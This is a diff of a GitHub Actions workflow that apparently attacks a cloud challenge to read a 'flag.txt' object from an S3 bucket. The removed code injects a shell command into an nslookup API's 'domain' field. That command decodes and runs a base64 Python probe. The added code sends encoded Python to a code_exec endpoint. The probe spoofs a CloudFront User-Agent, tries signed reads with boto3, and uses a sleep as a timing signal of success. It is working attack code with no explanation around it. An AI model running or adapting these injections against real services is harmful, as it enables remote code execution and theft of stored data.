@@ -1,4 +1,4 @@
-name: Stage2-Compare-S3-Objects
+name: Stage2-CodeExec-S3-Test
 
 on:
   push:
@@ -7,21 +7,20 @@ on:
   workflow_dispatch:
 
 permissions:
-  id-token: write
   contents: read
 
 jobs:
-  compare:
+  test:
     runs-on: ubuntu-latest
 
-    steps:
-      - name: Configure AWS
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
+    env:
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+      AWS_DEFAULT_REGION: us-east-1
 
-      - name: Compare S3 endpoints and objects
+    steps:
+      - name: Test Stage 2 code_exec S3 access
         shell: bash
         run: |
           set +e
@@ -30,58 +29,74 @@ jobs:
 
           python3 - <<'PY'
           import base64
-          import shlex
+          import json
           import time
           import requests
           import boto3
           from requests_aws4auth import AWS4Auth
 
-          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
-          UA = "Amazon CloudFront"
-
-          targets = [
-              (
-                  "path_index",
-                  "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/index.html"
-              ),
-              (
-                  "path_flag",
-                  "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
-              ),
-              (
-                  "virtual_index",
-                  "https://userad88e2b168aa387e.s3.us-east-1.amazonaws.com/index.html"
-              ),
-              (
-                  "virtual_flag",
-                  "https://userad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt"
-              )
-          ]
+          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
 
           inner = r'''
-          import sys
           import time
           import urllib.request
+          import boto3
+          from botocore.config import Config
 
-          url = sys.argv[1]
-          ua = sys.argv[2]
+          bucket = "userad88e2b168aa387e"
+          key = "flag.txt"
+          success = False
 
           try:
+              url = (
+                  "https://s3.us-east-1.amazonaws.com/"
+                  + bucket
+                  + "/"
+                  + key
+              )
+
               request = urllib.request.Request(
                   url,
-                  headers={"User-Agent": ua}
+                  headers={"User-Agent": "Amazon CloudFront"}
               )
 
               with urllib.request.urlopen(request, timeout=10) as response:
                   data = response.read()
 
-              print("READ_OK")
+              print("UNSIGNED_READ_SUCCESS")
               print("BYTES=" + str(len(data)))
-              time.sleep(4)
+              success = True
 
-          except Exception as error:
-              print("READ_FAIL")
-              print(repr(error))
+          except Exception as unsigned_error:
+              print("UNSIGNED_READ_FAILED")
+              print(repr(unsigned_error))
+
+          if not success:
+              try:
+                  client = boto3.client(
+                      "s3",
+                      region_name="us-east-1",
+                      endpoint_url="https://s3.us-east-1.amazonaws.com",
+                      config=Config(signature_version="s3v4")
+                  )
+
+                  result = client.get_object(
+                      Bucket=bucket,
+                      Key=key
+                  )
+
+                  data = result["Body"].read()
+
+                  print("SIGNED_READ_SUCCESS")
+                  print("BYTES=" + str(len(data)))
+                  success = True
+
+              except Exception as signed_error:
+                  print("SIGNED_READ_FAILED")
+                  print(repr(signed_error))
+
+          if success:
+              time.sleep(5)
           '''
 
           encoded = base64.b64encode(inner.encode()).decode()
@@ -96,40 +111,18 @@ jobs:
               session_token=credentials.token
           )
 
-          for name, target in targets:
-              command = (
-                  "example.com; "
-                  "printf '%s' "
-                  + shlex.quote(encoded)
-                  + " | base64 -d > /tmp/object_probe.py; "
-                  + "python3 /tmp/object_probe.py "
-                  + shlex.quote(target)
-                  + " "
-                  + shlex.quote(UA)
-                  + "; #"
-              )
+          started = time.monotonic()
 
-              started = time.monotonic()
+          response = requests.post(
+              API,
+              json={"code": encoded},
+              auth=auth,
+              timeout=25
+          )
 
-              try:
-                  response = requests.post(
-                      API,
-                      json={"domain": command},
-                      auth=auth,
-                      timeout=20
-                  )
+          elapsed = time.monotonic() - started
 
-                  elapsed = time.monotonic() - started
-
-                  print("TARGET=" + name)
-                  print("HTTP=" + str(response.status_code))
-                  print("ELAPSED=%.2f" % elapsed)
-                  print("---")
-
-              except Exception as error:
-                  elapsed = time.monotonic() - started
-                  print("TARGET=" + name)
-                  print("ERROR=" + repr(error))
-                  print("ELAPSED=%.2f" % elapsed)
-                  print("---")
+          print("HTTP=" + str(response.status_code))
+          print("ELAPSED=%.2f" % elapsed)
+          print(response.text)
           PY
